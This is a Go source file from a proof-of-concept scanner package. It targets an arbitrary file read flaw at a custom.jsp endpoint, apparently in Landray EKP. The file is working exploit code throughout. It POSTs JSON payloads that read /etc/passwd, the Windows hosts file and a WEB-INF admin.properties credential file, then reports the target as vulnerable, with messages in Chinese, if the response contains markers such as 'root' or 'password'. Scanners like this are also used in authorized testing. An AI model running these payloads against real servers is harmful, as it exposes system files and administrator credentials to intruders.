package pocs

import (
	"sentimentalgirl/utils"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

var path string = "/sys/ui/extend/varkind/custom.jsp"
var data_linux string = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
var data_win string = "var={\"body\":{\"file\":\"file://c:/windows/system32/drivers/etc/hosts\"}}"
var data_pass string = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}"
var data = [3] string{data_linux,data_win,data_pass}

func CheckCustomReadFile(checkurl string) int{
	vulurl := checkurl + path
	client := utils.HttpClient
	for _,value := range data {
		req,_ := http.NewRequest("POST",vulurl,strings.NewReader(value))
		req.Header.Add("Content-Type","application/x-www-form-urlencoded")
		req.Header.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36")
		response,err := client.Do(req)
		if (err != nil) {
			color.Yellow("[ " + checkurl + " ] " + "访问时发生错误")
			utils.WriteFlush.WriteString("[ " + checkurl + " ] " + "访问时发生错误 \r\n")
			utils.WriteFlush.Flush()
			return -1
		}
		defer response.Body.Close()
		body,_ := ioutil.ReadAll(response.Body)
		if (strings.Contains(string(body),"root") || strings.Contains(string(body),"password") || strings.Contains(string(body),"127.0.0.1")) {
			color.Red("[ " + checkurl + " ] " + "存在 custom-readfile 漏洞 ")
			utils.WriteFlush.WriteString("[ " + checkurl + " ] " + "存在 custom-readfile 漏洞 \r\n")
			utils.WriteFlush.Flush()
			break
		}
	}
	return 0
}